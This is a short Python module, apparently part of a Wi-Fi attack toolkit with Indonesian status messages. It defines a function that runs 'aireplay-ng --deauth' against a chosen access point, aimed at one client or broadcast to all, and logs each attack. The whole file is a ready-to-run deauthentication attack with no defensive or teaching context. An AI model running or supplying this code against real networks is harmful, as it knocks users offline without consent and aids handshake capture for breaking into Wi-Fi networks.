import subprocess
from termcolor import colored # type: ignore
from core.utils import write_log

def deauth_attack(interface, bssid, client_mac="", count=10):
    print(colored(f"[*] Menjalankan deauth attack ke BSSID: {bssid}", "yellow"))
    if client_mac:
        print(colored(f"[*] Target client: {client_mac}", "yellow"))
    else:
        print(colored("[*] Target client: broadcast (semua client)", "yellow"))

    try:
        cmd = [
            "sudo", "aireplay-ng",
            "--deauth", str(count),
            "-a", bssid,
        ]

        if client_mac:
            cmd += ["-c", client_mac]

        cmd.append(interface)

        subprocess.run(cmd)

        # ✍️ Tulis log serangan
        log_entry = f"Deauth attack ke BSSID={bssid}, Client={'ALL' if not client_mac else client_mac}, Count={count}, Interface={interface}"
        write_log("output/logs/deauth.log", log_entry)

        print(colored("[✓] Deauth attack selesai (log tersimpan).", "green"))

    except Exception as e:
        print(colored(f"[!] Gagal menjalankan deauth attack: {e}", "red"))
